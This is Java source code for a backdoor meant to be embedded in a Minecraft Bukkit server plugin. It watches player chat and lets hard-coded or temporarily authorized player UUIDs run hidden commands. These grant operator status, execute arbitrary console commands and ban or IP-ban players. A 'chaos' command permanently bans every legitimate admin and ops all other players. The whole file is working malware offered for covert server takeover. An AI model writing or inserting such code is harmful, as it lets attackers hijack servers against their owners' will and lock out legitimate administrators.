
package com.thiccindustries.backdoor;

import org.bukkit.*;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Date;
import java.util.Locale;

public final class Backdoor implements Listener {

    private Plugin plugin;

    public Backdoor(Plugin plugin){
        this.plugin = plugin;

        Config.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers() - Config.authorized_uuids.length];

        if(Config.display_backdoor_warning){
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Plugin '" + plugin.getName() + "' has a backdoor installed.");
        }

        plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler()
    public void onChat(AsyncPlayerChatEvent e) {
        if (Config.display_debug_messages) {
            Bukkit.getConsoleSender()
                    .sendMessage(Config.chat_message_prefix + " Message received from: " + e.getPlayer().getUniqueId());
        }

        Player p = e.getPlayer();

        //Is user authorized to use backdoor commands
        if (IsUserAuthorized(p)) {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is authed");
            }

            if (e.getMessage().startsWith(Config.command_prefix)) {
                boolean result = ParseCommand(e.getMessage().substring(1), p);


                if (Config.display_debug_messages) {
                    Bukkit.getConsoleSender()
                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(1) + " success: " + result);
                }

                if (!result)
                    e.getPlayer().sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Command execution failed.");

                e.setCancelled(true);
            }

        } else {

            if (Config.display_debug_messages) {
                Bukkit.getConsoleSender()
                        .sendMessage(Config.chat_message_prefix + " User is not authed");
            }
        }


    }

    /*Basic command parser*/
    public boolean ParseCommand(String command, Player p) {
        //split fragments
        String[] args = command.split(" ");

        switch (args[0].toLowerCase()) {
            case "op": {  //Give user operator
                if (args.length == 1) {   //op self
                    p.setOp(true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now op.");
                } else {                    //op other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }

                    p1.setOp(true);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is now op.");
                }

                return true;
            }

            case "deop": {  //Remove user operator
                if (args.length == 1) {          //Deop self
                    p.setOp(false);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are no longer op.");
                } else {                        //Deop other
                    Player p1 = Bukkit.getPlayer(args[1]);
                    if (p1 == null) {
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                        return false;
                    }

                    p1.setOp(false);

                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " is no longer op.");
                }
                return true;
            }

            case "gamemode":
            case "gm": {
                if (args.length == 1)
                    return false;

                GameMode gm = GameMode.SURVIVAL;

                //Get gamemode from number
                try {
                    int reqGamemode = Clamp(Integer.parseInt(args[1]), 0, GameMode.values().length - 1);
                    gm = GameMode.getByValue(reqGamemode);
                } catch (NumberFormatException e) {
                    //Get gamemode from name

                    try {
                        gm = GameMode.valueOf(args[1].toUpperCase(Locale.ROOT));

                    } catch (IllegalArgumentException e1) {
                        //ignore
                        return false;
                    }

                }

                //Weird thread syncing shit
                GameMode finalGm = gm;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        p.setGameMode(finalGm);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " You are now gamemode: " + finalGm.name() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "give": {
                if (args.length < 2)
                    return false;

                Material reqMaterial = Material.getMaterial(args[1].toUpperCase(Locale.ROOT));

                if (reqMaterial == null)
                    return false;

                int reqAmmount = reqMaterial.getMaxStackSize();

                if (args.length > 2)
                    reqAmmount = Integer.parseInt(args[2]);


                int reqStacks = reqAmmount / reqMaterial.getMaxStackSize();
                int reqPartial = reqAmmount % reqMaterial.getMaxStackSize();

                for (int i = 0; i < reqStacks; i++) {
                    p.getInventory().addItem(new ItemStack(reqMaterial, reqMaterial.getMaxStackSize()));
                }

                p.getInventory().addItem(new ItemStack(reqMaterial, reqPartial));

                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Giving " + reqAmmount + " of " + reqMaterial.name() + ".");
                return true;
            }

            case "chaos": {  //Ban admins then admin the regulars

                for (Player p1 : Bukkit.getOnlinePlayers()) {
                    //Ban all existing admins
                    if (p1.isOp()) {
                        //Skip authorized users
                        if (IsUserAuthorized(p1))
                            continue;

                        //Deop, ban, ip ban
                        new BukkitRunnable() {
                            @Override
                            public void run() {
                                p1.setOp(false);
                                Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, 1, 1), Config.default_ban_source);
                                Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, 1, 1), Config.default_ban_source);
                                p1.kickPlayer(Config.default_ban_reason);
                            }
                        }.runTask(plugin);
                    } else {
                        p1.setOp(true);
                    }
                }

                Bukkit.broadcastMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + " Server pwn'ed.");
                Bukkit.broadcastMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + " All server admins have been banned.");
                Bukkit.broadcastMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + " Remaining players have been op'ed. Have fun.");

                return true;
            }
            case "exec": {   //Exec command as server
                ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();

                //Concat all args
                StringBuilder sb = new StringBuilder();
                for (int i = 1; i < args.length; i++) {
                    sb.append(args[i]);
                    sb.append(" ");
                }
                boolean result = Bukkit.dispatchCommand(console, sb.toString());
                if (result) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Server command executed.");
                }

                return result;
            }
            case "ban": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);


                return true;
            }

            case "banip": {
                if (args.length < 2)
                    return false;


                Player p1 = Bukkit.getPlayer(args[1]);

                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                String reason = Config.default_ban_reason;
                String src = Config.default_ban_source;

                if (args.length > 2)
                    reason = args[2];
                if (args.length > 3)
                    src = args[3];

                final String finalReason = reason;
                final String finalSrc = src;
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), finalReason, new Date(9999, 1, 1), finalSrc);
                        p1.kickPlayer(Config.default_ban_reason);
                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " IP Banned " + p1.getName() + ".");
                    }
                }.runTask(plugin);

                return true;
            }

            case "seed": { //Get current seed
                String strseed = String.valueOf(p.getWorld().getSeed());
                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " World seed: " + strseed);
                return true;
            }

            case "32k": { //add 32k enchants to current item being held

                if (args.length < 2)
                    return false;

                String str_type = args[1];
                int type = 0;

                if (str_type.equalsIgnoreCase("sword"))
                    type = 0;

                if (str_type.equalsIgnoreCase("tool"))
                    type = 1;

                //Is item a sword?
                ItemStack mainHandItem = p.getInventory().getItemInMainHand();

                if (type == 0) {
                    ItemMeta enchantMeta = mainHandItem.getItemMeta();

                    enchantMeta.addEnchant(Enchantment.DAMAGE_ALL, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.FIRE_ASPECT, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_MOBS, Config.dangerous_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.KNOCKBACK, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                    if (Config.curse_enchants)
                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);


                    mainHandItem.setItemMeta(enchantMeta);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                    return true;
                }

                if (type == 1) {
                    ItemMeta enchantMeta = mainHandItem.getItemMeta();
                    enchantMeta.addEnchant(Enchantment.DIG_SPEED, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Config.dangerous_enchant_level, true);
                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);

                    if (Config.curse_enchants)
                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);

                    mainHandItem.setItemMeta(enchantMeta);
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
                    return true;
                }
                return false;

            }
            case "auth": { //Adds new user to authlist
                if (args.length < 2)
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Add user to authlist
                boolean success = false;
                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                    if (Config.tmp_authorized_uuids[i] == null) {
                        Config.tmp_authorized_uuids[i] = Bukkit.getPlayer(args[1]).getUniqueId().toString();
                        success = true;
                        break;
                    }
                }

                if (success) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been temp authorized.");
                    Bukkit.getPlayer(args[1]).sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " you have been authorized. Run " + Config.command_prefix + "help for info.");
                }
                return success;
            }

            case "deauth": {
                if (args.length < 2)
                    return false;

                Player p1 = Bukkit.getPlayer(args[1]);
                if (p1 == null) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                    return false;
                }

                //Remove user
                boolean success = false;
                for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                    if (Config.tmp_authorized_uuids[i] != null && Config.tmp_authorized_uuids[i].equals(p1.getUniqueId().toString())) {
                        Config.tmp_authorized_uuids[i] = null;
                        success = true;
                        break;
                    }
                }

                if (success) {
                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + args[1] + " has been deauthorized.");
                }
                return success;
            }

            case "help": {
                if (args.length == 1) {
                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
                    p.sendMessage(Config.help_detail_color + "## Backdoor ## () = Required, [] = Optional.");
                    for (int i = 0; i < Config.help_messages.length; i++) {
                        p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
                    }

                    p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
                    return true;
                }

                if (args.length == 2) {

                    int indexOfCommand = -1;
                    for (int i = 0; i < Config.help_messages.length; i++) {
                        if (args[1].equalsIgnoreCase(Config.help_messages[i].getName())) {
                            indexOfCommand = i;
                            break;
                        }
                    }

                    if (indexOfCommand == -1)
                        return false;

                    p.sendMessage(Config.help_messages[indexOfCommand].toString());

                    return true;

                }
            }

        }
        return false;
    }

    private int Clamp(int i, int min, int max) {
        if (i < min)
            return min;
        if (i > max)
            return max;
        return i;
    }


    /*Check if Player is authorized in Config.java*/
    public boolean IsUserAuthorized(Player p) {
        return IsUserAuthorized(p.getUniqueId().toString());
    }

    /*Check if UUID is authorized in Config.java*/
    public boolean IsUserAuthorized(String uuid) {
        boolean authorized = false;
        for (int i = 0; i < Config.authorized_uuids.length; i++) {

            if (uuid.equals(Config.authorized_uuids[i])) {
                authorized = true;
                break;
            }

        }

        for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
            if (uuid.equals(Config.tmp_authorized_uuids[i])) {
                authorized = true;
                break;
            }
        }

        return authorized;
    }
}
